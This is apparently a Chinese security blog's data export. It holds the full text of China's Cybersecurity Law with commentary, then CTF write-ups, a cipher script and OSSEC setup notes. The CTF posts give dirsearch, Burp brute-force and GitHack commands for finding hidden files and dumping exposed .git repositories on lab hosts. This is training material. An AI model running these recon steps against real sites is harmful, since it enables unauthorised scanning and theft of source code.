国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 第二章 网络安全支持与促进 第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。 第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。 第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 第三章 网络运行安全 第一节 一般规定 第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改： （一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； （二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； （三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； （四）采取数据分类、重要数据备份和加密等措施； （五）法律、行政法规规定的其他义务。 第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支 - 持和协助。 第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。 第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： （一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； （二）定期对从业人员进行网络安全教育、技术培训和技能考核； （三）对重要系统和数据库进行容灾备份； （四）制定网络安全事件应急预案，并定期进行演练； （五）法律、行政法规规定的其他义务。 第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： （一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估； （二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力； （三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享； （四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 第四章 网络信息安全 第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 第四十八条 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。 第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。 第五章 监测预警与应急处置 第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施： （一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； （二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； （三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。 第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。 第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 第六章 法律责任 第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： （一）设置恶意程序的； （二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；（- 三）擅自终止为其产品、服务提供安全维护的。 第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。 第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款： （一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； （二）拒绝、阻碍有关部门依法实施的监督检查的； （三）拒不向公安机关、国家安全机关提供技术支持和协助的。 第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。 第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。 第七章附 则 第七十六条 本法下列用语的含义： （一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 （二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 （三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 （四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 （五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。 第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。 第七十八条 军事网络的安全保护，由中央军事委员会另行规定。 第七十九条 本法自 2017 年 6 月 1 日起施行。 内容解读《网络安全法》是我国第一部全面规范网络空间安全管理方面问题的基础性法律，是我国网络空间法治建设的重要里程碑，是依法治网、化解网络风险的法律重器，是让互联网在法治轨道上健康运行的重要保障。 [3] 《网络安全法》将近年来一些成熟的好做法制度化，并为将来可能的制度创新做了原则性规定，为网络安全工作提供切实法律保障。本法在以下几个方面值得特别关注： 一、《网络安全法》的基本原则 第一，网络空间主权原则。《网络安全法》第 1 条 “立法目的” 开宗明义，明确规定要维护我国网络空间主权。网络空间主权是一国国家主权在网络空间中的自然延伸和表现。习近平总书记指出，《联合国宪章》确立的主权平等原则是当代国际关系的基本准则，覆盖国与国交往各个领域，其原则和精神也应该适用于网络空间。各国自主选择网络发展道路、网络管理模式、互联网公共政策和平等参与国际网络空间治理的权利应当得到尊重。第 2 条明确规定《网络安全法》适用于我国境内网络以及网络安全的监督管理。这是我国网络空间主权对内最高管辖权的具体体现。 /第二，网络安全与信息化发展并重原则。习近平总书记指出，安全是发展的前提，发展是安全的保障，安全和发展要同步推进。网络安全和信息化是一体之两翼、驱动之双轮，必须统一谋划、统一部署、统一推进、统一实施。《网络安全法》第 3 条明确规定，国家坚持网络安全与信息化并重，遵循积极利用、科学发展、依法管理、确保安全的方针；既要推进网络基础设施建设，鼓励网络技术创新和应用，又要建立健全网络安全保障体系，提高网络安全保护能力，做到 “双轮驱动、两翼齐飞”。 第三，共同治理原则。网络空间安全仅仅依靠政府是无法实现的，需要政府、企业、社会组织、技术社群和公民等网络利益相关者的共同参与。《网络安全法》坚持共同治理原则，要求采取措施鼓励全社会共同参与，政府部门、网络建设者、网络运营者、网络服务提供者、网络行业相关组织、高等院校、职业学校、社会公众等都应根据各自的角色参与网络安全治理工作。 二、《网络安全法》提出制定网络安全战略，明确网络空间治理目标，提高了我国网络安全政策的透明度 《网络安全法》第 4 条明确提出了我国网络安全战略的主要内容，即：明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。第 7 条明确规定，我国致力于 “推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。” 这是我国第一次通过国家法律的形式向世界宣示网络空间治理目标，明确表达了我国的网络空间治理诉求。上述规定提高了我国网络治理公共政策的透明度，与我国的网络大国地位相称，有利于提升我国对网络空间的国际话语权和规则制定权，促成网络空间国际规则的出台。 三、《网络安全法》进一步明确了政府各部门的职责权限，完善了网络安全监管体制 《网络安全法》将现行有效的网络安全监管体制法制化，明确了网信部门与其他相关网络监管部门的职责分工。第 8 条规定，国家网信部门负责统筹协调网络安全工作和相关监督管理工作，国务院电信主管部门、公安部门和其他有关机关依法在各自职责范围内负责网络安全保护和监督管理工作。这种 “1+X” 的监管体制，符合当前互联网与现实社会全面融合的特点和我国监管需要。 四、《网络安全法》强化了网络运行安全，重点保护关键信息基础设施 《网络安全法》第三章用了近三分之一的篇幅规范网络运行安全，特别强调要保障关键信息基础设施的运行安全。关键信息基础设施是指那些一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的系统和设施。网络运行安全是网络安全的重心，关键信息基础设施安全则是重中之重，与国家安全和社会公共利益息息相关。为此，《网络安全法》强调在网络安全等级保护制度的基础上，对关键信息基础设施实行重点保护，明确关键信息基础设施的运营者负有更多的安全保护义务，并配以国家安全审查、重要数据强制本地存储等法律措施，确保关键信息基础设施的运行安全。 五、《网络安全法》完善了网络安全义务和责任，加大了违法惩处力度 《网络安全法》将原来散见于各种法规、规章中的规定上升到人大法律层面，对网络运营者等主体的法律义务和责任做了全面规定，包括守法义务，遵守社会公德、商业道德义务，诚实信用义务，网络安全保护义务，接受监督义务，承担社会责任等，并在 “网络运行安全”、“网络信息安全”、“监测预警与应急处置” 等章节中进一步明确、细化。在 “法律责任” 中则提高了违法行为的处罚标准，加大了处罚力度，有利于保障《网络安全法》的实施。 六、《网络安全法》将监测预警与应急处置措施制度化、法制化 《网络安全法》第五章将监测预警与应急处置工作制度化、法制化，明确国家建立网络安全监测预警和信息通报制度，建立网络安全风险评估和应急工作机制，制定网络安全事件应急预案并定期演练。这为建立统一高效的网络安全风险报告机制、情报共享机制、研判处置机制提供了法律依据，为深化网络安全防护体系，实现全天候全方位感知网络安全态势提供了法律保障。","categories":[],"tags":[{"name":"中国网络安全法","slug":"中国网络安全法","permalink":"http://www.xiaocaibi.top/tags/%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"},{"name":"web安全小菜逼","slug":"web安全小菜逼","permalink":"http://www.xiaocaibi.top/tags/web%E5%AE%89%E5%85%A8%E5%B0%8F%E8%8F%9C%E9%80%BC/"},{"name":"法律","slug":"法律","permalink":"http://www.xiaocaibi.top/tags/%E6%B3%95%E5%BE%8B/"}]},{"title":"掌控安全CTF解题","slug":"掌控安全CTF解题","date":"2021-09-16T07:39:08.000Z","updated":"2021-09-20T08:47:43.807Z","comments":true,"path":"posts/a7cfb8f6.html","link":"","permalink":"http://www.xiaocaibi.top/posts/a7cfb8f6.html","excerpt":"","text":"掌控安全CTF解题第一题 web1靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web1/index.php 进入靶场 根据题目提示,按f12打开开发者工具查看源代码 进来之后,我们发现里面什么都没有,只有一个js的文件路径,我猜应该放在js里面面,./3719372767312836781.jssz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web1/3719372767312836781.js 进来之后发现了有一串Unicode值,于是游览器搜索String.fromCharCode,原来这里调用了JavaScript的函数 我们使用在线工具进行转换,就可以得到flag 第二题web2靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web2/2.html 进入靶场 然后按f12查看源码 查看了源码什么都没有发现,这是我们可以按ctrl+u 就可以获得flag 第三题web3靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web3/webl.php 进入靶场 使用burp工具进行爆破,将webl.php,l作为参数,使用26个大小写字母和0-10作为字典进行爆破 第四题web4靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web4/index.php 按f12查看源代码就直接可以获得falg 第五题web5靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web5/index.html 进入靶场 根据提示,我们打开burp开启抓包 由于该网站是静态网页,burp抓包不到包,我们需要在游览器将index.html,改成index.php 这时候抓包了两个包,点击查看源代码 就可以获得falg 第六题web6靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web6/8.html 进入靶场 按f12查看源代码直获得flag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.xiaocaibi.top/tags/CTF/"}]},{"title":"从0到1CTF成长之路题目解题","slug":"从0到1CTF成长之路题目解题","date":"2021-09-14T02:49:26.000Z","updated":"2021-09-20T08:47:43.791Z","comments":true,"path":"posts/1cd2f2cf.html","link":"","permalink":"http://www.xiaocaibi.top/posts/1cd2f2cf.html","excerpt":"","text":"成长之路集合1题常见的搜集靶场链接:http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com/ 知识: 掌握使用dirsearch 工具链接:https://github.com/maurosoria/dirsearch/ dirsearch的用法 dirsearch.py -u 网址 -e 语言(一般用*) 步骤 (1)进入靶场,是这样子的 (2)首先我们使用dirsearch对网站的目录进行扫描 python3 dirsearch.py -u http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com/ -e php 发现 index.php~ robost.txt index.php.swp index.php/login index.php 绿色的200表示请求成功 (3)我们直接访问 http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com/index.php~ (4)在这里可以看到有fang2一串字符,我们先创建个文本将这段先保存下来 (5)在进入robots.txt (6)根据提示flag1就在这路径,我们进入到 http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com//flag1_is_her3_fun.txt 就可以获得第一段的flag 进入.index.php.swp,将文件保存到电脑,使用记事本打开 就可以获得第三段flag 最后拼接起来来 flag1:n1book{info_1 flag2:s_v3ry_im flag3:p0rtant_hack} 最终答案n1book{info_1s_v3ry_im p0rtant_hack} 第二题粗心的小李环境链接:http://eci-2ze66ydaexstbikm0k5c.cloudeci1.ichunqiu.com/ 使用工具 gitHackr 步骤 进入靶场 根据题目提示这主要还是考察工具的使用,首先我们使用gitHacker对网站进行扫描 python GitHack.py http://eci-2ze66ydaexstbikm0k5c.cloudeci1.ichunqiu.com/.git/ 扫描的结果在目录下,我们可以ls 这里就多出了我们刚才扫过网站的一个文件夹,我们cd进入里面使用cat 查看index里面的内容最终答案 1book{git_looks_s0_easyfun}","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.xiaocaibi.top/tags/CTF/"}]},{"title":"CTF常用python脚本","slug":"CTF常用脚本","date":"2021-09-13T07:30:40.000Z","updated":"2021-09-20T08:47:43.775Z","comments":true,"path":"posts/19f567c6.html","link":"","permalink":"http://www.xiaocaibi.top/posts/19f567c6.html","excerpt":"","text":"CTF常用脚本栅栏密码string = input(\"输入:\") frequency = [] # 获得栅栏的栏数 result_len = len(string) # 栅栏密码的总长度 25 for i in range(2, result_len): # 最小栅栏长度为2 逐个测试2,3,4.... if(result_len % i == 0): # 当栅栏密码的总长度 模 i 余数为0 则这个i就是栅栏密码的长度 frequency.append(i) for numberOfColumn in frequency: # 循环可能分的栏数 RESULT = [] # 保存各栏数的结果 for i in range(numberOfColumn): # i : 开始取值的位置 for j in range(i, result_len, numberOfColumn): # 开始取值， 隔栏数取一个值， 起始位置是i RESULT.append(string[j]) print(\"\".join(RESULT))","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.xiaocaibi.top/tags/CTF/"}]},{"title":"ossec","slug":"ossec","date":"2021-08-23T11:18:30.000Z","updated":"2021-09-20T08:47:43.791Z","comments":true,"path":"posts/3e4c61fa.html","link":"","permalink":"http://www.xiaocaibi.top/posts/3e4c61fa.html","excerpt":"","text":"OSSEC配置②安装配置ossec在服务端配置 iptables 放行 OSSEC 通信端口；在数据库中创建 ossec 数据库和 ossec用户，并授权给予ossec用户管 理 ossec 数据库的所有权限；执行相应脚本安装 ossec服务端，安装目录为/usr/local/ossec/,开启联动 (active response)功能，运行 rootkit 检测，接受远程机器syslog；导入 ossec 服务端基本表结构到 mysql的ossec 数据库中；配置接收远程主机 syslog 的 ip 网段为 10.1.2.0 网段；添加 Web_Server(Server4) 和 File_Server(Server2) 为 agent端，agent ID 分别为 001、002；为 ossec 服务端配置 webui 管理界面 OSSEC 上的工作任务；③配置管理添加 Web_Server“/home/wwwlogs/”目录下的access 日志到 ossec日志源中；新建规则，规则名为 alert_attack、id 为 31180、level 为 6，检测wordpress url 地址包含.php 的文件，当 60 秒内同一 IP 访问.php文件超过20次， 触发该规则，命中信息为attacks_info；新建规则，规则名为alert_php，当Web_Server 中 index.php发生改变时发出警告，命中述信息为 index.php changed；配置规则，规则名为alert_port，检测Web_Server监听端口，当端口发生改变时产生报警日志，命中信息为 port changed；配置 ossec将level为10的警告信息发送到admin@worldskills2020.gd邮箱 环境准备centos7 两台 服务端ip 192.168.8.12 客户端ip 192.168.8.13 安装源码 